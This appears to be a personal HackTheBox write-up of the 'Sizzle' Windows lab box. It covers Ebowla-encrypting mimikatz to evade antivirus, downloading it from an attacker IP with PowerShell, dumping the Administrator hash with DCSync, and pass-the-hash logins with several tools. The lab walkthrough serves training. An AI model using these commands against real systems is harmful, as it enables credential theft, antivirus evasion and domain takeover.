<p><img src="https://chickenpwny.github.io/images/sizzle/barnacles.png" alt="barnacles" /></p>

<pre><code>creds mrlky | Football#7
</code></pre>

<pre><code>openssl pkcs12 -in mrlky.p12 -nocerts -out mrlky.key
openssl pkcs12 -in mrlky.p12 -clcerts -nokeys -out mrlky.crt
</code></pre>

<p>changing the names of cert and key in winrm</p>

<p>MIMIKATZ             ##### PHASE 6 ######</p>

<p>genetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computername as sizzle.</p>

<p>trying to get mimikatz to work pretty touch my object now is to encode mimikatz using ebowla. I ran file on the two verison of mimikatz i have aviable. ones a x86 binary the other is a x32. Ive been trying to compile the x86. spent all day today getting some other stuff to work . xD im not even going to go into the rabbit hole i went into but, ill be covering how to install &amp; setup ebowla.py</p>

<p>note: locate mimi*.exe find the x64 version then copy it into Ebowla</p>

<pre><code>python ebowla.py mimikatz_x64.exe genetic.config                                        
[*] Using Symmetric encryption
[*] Payload length 927384
[*] Payload_type exepyth
[*] Using EXE payload template                                                                                            
[*] Used environment variables:
        [-] environment value used: computername, value used: sizzle                                                      
[!] Path string not used as pasrt of key
[!] External IP mask NOT used as part of key
[!] System time mask NOT used as part of key
[*] String used to source the encryption key: sizzle
[*] Applying 10000 sha512 hash iterations before encryption
[*] Encryption key: 292aac24504dfa3fb72ece428be091473c5f4cb28b29e1bd4c2f5a744842ef2b                                      
[*] Writing GO payload to: go_symmetric_mimikatz_x64.exe.go
</code></pre>

<pre><code>./build_x64_go.sh output/go_symmetric_mimikatz_x64.exe.go mimikatebowx64.exe            
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy mimikatebowx64.exe to output
[*] Cleaning up
[*] Done
</code></pre>

<p>Now, copy over the files using smbclient. then transfer the files to a writeable directory.</p>

<pre><code>cd c:\windows\system32\microsoft\crypto\rsa\machinekeys\
cd c:\Windows\System32\spool\drivers\color\
</code></pre>

<p>Onces everything is setup you may encounter problems like mimikatz using 8000 lines blank. mimikatcs will lets you run commands so well take advantage of that before it closes. if you scroll up those 8000 lines well find our hashes.</p>

<pre><code>powershell iwr http://10.10.15.105/mimikatebowx64.exe -outfile pinkie.exe
</code></pre>

<pre><code>.\pinkie.exe Mimi-Command '&quot;lsadump::dcsync /user:Administrator&quot;' 
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/mmimi-katz3.PNG" alt="mmimi-katz3" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/mmimi-katz4.PNG" alt="mmimi-katz4" /></p>

<p><img src="https://chickenpwny.github.io/images/sizzle/mmimi-katz2.PNG" alt="mmimi-katz2" /></p>

<p>NTML-HASH pAsSThEHaSh</p>

<pre><code>crackmapexec 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
</code></pre>

<p><img src="https://chickenpwny.github.io/images/sizzle/crack-logon-fail.PNG" alt="crack-logon-fail" /></p>

<pre><code>pth-winexe -U aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 //10.10.10.103 cmd.exe
</code></pre>

<pre><code>python wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103
</code></pre>

<pre><code>smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:40c426273013ae36c8f2e329f35f25fe 10.10.10.103
</code></pre>


    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/hackthebox/boxes/sizzle/" title="Sizzle"> <i class="fa fa-chevron-left"></i><label>Sizzle</label></a>
    <a class="nav nav-next" href="/hackthebox/boxes/valentine/" title="Valentine" style="margin-right: 0px;"><label>Valentine</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/gold-sizzle.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>